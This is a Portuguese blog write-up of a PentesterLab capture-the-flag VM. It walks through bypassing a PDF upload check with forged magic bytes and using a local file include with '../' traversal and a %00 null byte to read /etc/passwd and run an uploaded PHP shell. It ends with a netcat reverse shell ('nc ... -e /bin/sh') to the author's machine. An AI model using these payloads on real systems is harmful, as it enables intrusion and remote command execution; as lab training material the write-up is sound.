---
layout: default
title: PHP Include And Post Exploitation [PentesterLab] Write-up
date: 2017-12-17 20:22
author: brennords
comments: true
categories: [CTFs]
---
Além de CTFs online, há CTFs que podem ser jogados off-line. Eles são, normalmente, máquinas virtuais criadas com vulnerabilidades especificas e prontas para serem ownadas.

Existem uns sites em que a galera posta essas máquinas para download. Um dos que conheço é o <a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a>. Eles oferecem umas isos como forma de exercicio para o curso que vendem. Algumas delas são só para os assinantes do curso mas outras são liberadas para todos. E foi uma dessas gratuitas que baixei e resolvi ver o que conseguiria.

Já que sou noob, peguei uma das menos dificeis: a <a href="https://pentesterlab.com/exercises/php_include_and_post_exploitation">PHP Include and Post Exploitation</a>. A descrição dela é a seguinte:

<blockquote>This exercise describes the exploitation of a local file include with limited access. Once code execution is gained, you will see some post exploitation tricks.</blockquote>

Numa tradução livre seria: "<em>Este exercicio descreve a exploração de um local file include com acesso limitado. Assim que execução de código for obtida, veremos alguns truques de pós exploração.</em>"

Usei o <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">Virtual Box</a> para dar boot na ISO de 171 Mb que você poderia baixar <a href="https://pentesterlab.com/exercises/php_include_and_post_exploitation/iso" target="_blank" rel="noopener">aqui</a> e tentar algo antes de ler a solução que encontrei.

Depois do completo processo de boot, mandei um <em>ifconfig</em> no terminal da vm para descobrir qual o endereço ip que ela havia pego para si dentro da minha rede local.

<img class="alignnone size-full wp-image-1503" src="https://brenn0.files.wordpress.com/2017/12/ip.png" alt="ip" width="722" height="472" />

Pode-se observar que a placa de rede eth0 pegou o ip 192.168.0.33.

Obs: a configuração da rede na máquina virtual fica longe do escopo do write-up. Caso você esteja tendo problemas com isso, considere como a primeira parte do desafio ;)

Pelo nome e a descrição dada ao desafio, é de se supor com um bocado de segurança que há um servidor web usando php. Mas, para simular algo menos longe da realidade, que tal fingir que não se sabe porra nenhuma?

Neste caso, costumo começar usando o nmap para encontrar as portas abertas e os possíveis serviços oferecidos:

https://gist.github.com/anonymous/d06adb17c3799e1e561bf347c775d3cb

O resultado mostra que esse ip tem a porta 80 aberta e está rodando o Apache 2.2.16.

Mesmo que essa versão do apache não seja uma das mais recentes, não há vulnerabilidades a serem exploradas para nosso fim. Hora de ver que tipo de serviço web que o Apache está rodando.

<img class="alignnone size-full wp-image-1504" src="https://brenn0.files.wordpress.com/2017/12/php_pentesterlab1.png" alt="php_pentesterlab1" width="934" height="578" />

É um site de uma conferência sobre segurança web. No canto superior direito há links para submeter um paper e fazer login.

Primeiro, fui analisar a página de submissão.

<img class="alignnone size-full wp-image-1505" src="https://brenn0.files.wordpress.com/2017/12/php_pentestlabs2.png" alt="php_pentestlabs2" width="915" height="636" />

Há um botão para o envio de um arquivo PDF da minha apresentação. Parecia ser uma boa oportunidade para tentar fazer o upload de uma shell em php. Mas após preencher os dados e tentar enviar o arquivo, recebi essa mensagem:

<img class="alignnone size-full wp-image-1506" src="https://brenn0.files.wordpress.com/2017/12/php3.png" alt="php3" width="923" height="192" />

Há alguma forma de filtragem para o tipo de arquivo enviado.

Após algumas tentativas falhas, como, por exemplo, tentar renomear o meu php como shell.php.pdf, imaginei que o script php checava o header do arquivo para verificar se era ou não um PDF. Aí usei um <a href="https://github.com/GNOME/ghex" target="_blank" rel="noopener">editor hexadecimal</a> para adicionar ao meu arquivo php o header que um PDF válido teria. Esse valor é representado por: "<em>2550 4446 2d31 2e33 0a25 c4e5 f2e5 eba7"</em> que nada mais é que "<em>%PDF-1.3.%......"</em>

<img class="alignnone size-full wp-image-1507" src="https://brenn0.files.wordpress.com/2017/12/php4.png" alt="php4" width="755" height="533" />

Para mais informações sobre o formato PDF veja <a href="http://resources.infosecinstitute.com/pdf-file-format-basic-structure/#gref" target="_blank" rel="noopener">este link</a>.

Agora a shell php vai parecer ser um arquivo PDF porque, além da extensão, seu cabeçalho diz isso.

Preenchi as informações e enviei o arquivo <em>shell.php.pdf</em> no form. Dessa vez, ao invés de receber a mensagem de que só PDFs seriam aceitos, fui enviado a página inicial. Para confirmar que o upload rolou, fui na página de login e preenchi o email e senha que usei no form de submit paper.

<img class="alignnone size-full wp-image-1508" src="https://brenn0.files.wordpress.com/2017/12/php6.png" alt="php6" width="918" height="443" />

O problema é: o servidor não vai executar um arquivo com extensão pdf como se fosse um php. Ou seja, essa porra ainda não deu em nada.

Mas, até antes de conseguir fazer o upload da shell, reparei no formato da url do serviço: http://192.168.0.33/index.php?<strong>page=submit</strong>. Que tal mudar o argumento de page  e ver o que acontece?

<img class="alignnone size-full wp-image-1509" src="https://brenn0.files.wordpress.com/2017/12/php7.png" alt="php7" width="592" height="110" />

Profit! Temos uma potencial falha de <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability" target="_blank" rel="noopener">local file include </a>que ocorre quando o script php tenta inserir na página algum arquivo mas não faz nenhuma verificação dessa entrada. Dessa forma é possível "incluir" qualquer arquivo do servidor para exibição.

Logo que percebi a falha, saquei que podia usar "../", que representa o diretorio anterior, para sair da pasta do webserver e acessar a raiz do servidor. Esse tipo de ataque é conhecido como "<a href="https://en.wikipedia.org/wiki/Directory_traversal_attack" target="_blank" rel="noopener">Directory Transversal</a>". Tentei exibir o /etc/passwd como proof of concept.

<img class="alignnone size-full wp-image-1510" src="https://brenn0.files.wordpress.com/2017/12/php8.png" alt="php8" width="693" height="328" />

Mas o script automaticamente insere um ".php" no final da entrada, o que faz sentido já que provavelmente espera encontrar uma página php para execução. É um problema que pode ser solucionado ao inserir um %00 (<a href="https://null-byte.wonderhowto.com/how-to/null-byte-injections-work-history-our-namesake-0130141/" target="_blank" rel="noopener">null byte</a>) no final da URL, que funcionará como um "sinalizador" de que a string acabou, fazendo com que o script ignore o .php que será inserido.

<img class="alignnone size-full wp-image-1511" src="https://brenn0.files.wordpress.com/2017/12/php9.png" alt="php9" width="725" height="409" />

Agora a próxima sacada dependeria do quanto de conhecimento e prática se tem. Ao ver essa falha, pensei logo em usa-la para executar a shell que enviei como pdf já que, mesmo com a extensão pdf, ao <a href="http://php.net/manual/pt_BR/function.include.php" target="_blank" rel="noopener">incluir</a> meu arquivo malicioso, o código php do mesmo seria executado. E, graças a informação exposta ao se fazer login, que exibe o caminho do arquivo que mandei, sei exatamente que endereço incluir como argumento para page: <em>http://192.168.0.36/index.php?page=uploads/shell.php.pdf%00</em>

<img class="alignnone size-full wp-image-1512" src="https://brenn0.files.wordpress.com/2017/12/php91.png" alt="php9" width="737" height="358" />

Executado com sucesso! Então fiz login com a <a href="https://github.com/Snifer/L4bsForShell/blob/master/PHP/Antichat%20Shell%20v1.3.php" target="_blank" rel="noopener">shell</a>, que é um pouco limitada mas que dá para o gasto, e tratei de abrir uma conexão reversa com o netcat para meu computador.

Primeiro, coloquei o netcat para ficar na escuta (-l), em modo detalhado (-v), usando a porta (-p) 31337.

```root@budweiser:~/Desktop# nc -lvp 31337```

Depois, fui na simplória shell php e executei o seguinte comando:

```nc 192.168.0.29 31337 -e /bin/sh```

Isso fez com que o servidor se conectasse ao meu ip na porta que escolhi para meu netcat e, com a opção -e mando o nc executar /bin/sh após a conexão. Assim, com a conexão feita, os comandos que envio são executados por /bin/sh e o resultado me é enviado.

```root@budweiser:~/Desktop# nc -lvp 31337
Listening on [0.0.0.0] (family 0, port 31337)
Connection from [192.168.0.37] port 31337 [tcp/*] accepted (family 2, sport 36672)
whoami www-data
uname -a
Linux debian 2.6.32-5-686 #1 SMP Sun May 6 04:01:19 UTC 2012 i686 GNU/Linux
```

E por hoje o negócio foi esse aí. Você pode ver a solução oficial no site do <a href="https://pentesterlab.com/exercises/php_include_and_post_exploitation/course" target="_blank" rel="noopener">Pentester Lab</a>.
